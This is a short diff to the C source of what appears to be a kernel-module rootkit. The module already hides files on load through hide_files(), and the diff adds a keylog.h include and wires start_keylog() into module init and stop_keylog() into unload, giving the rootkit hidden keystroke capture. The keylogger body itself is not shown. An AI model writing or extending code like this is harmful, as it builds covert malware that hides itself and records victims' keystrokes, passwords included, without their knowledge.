@@ -20,6 +20,7 @@
 #include "privilege.h"
 #include "hook.h"
 #include "hide.h"
+#include "keylog.h"
 
 #include <sys/param.h>
 #include <sys/module.h>
@@ -53,6 +54,9 @@ init(void)
 
 	/* Hide files. */
 	hide_files();
+
+	/*start keylogging. */
+	start_keylog();
 }
 
 static void
@@ -64,6 +68,9 @@ die(void)
 
 	/* Unhide files. */
 	unhide_files();
+
+	/*Stop Keylog. */
+	stop_keylog();
 }
 
 static int
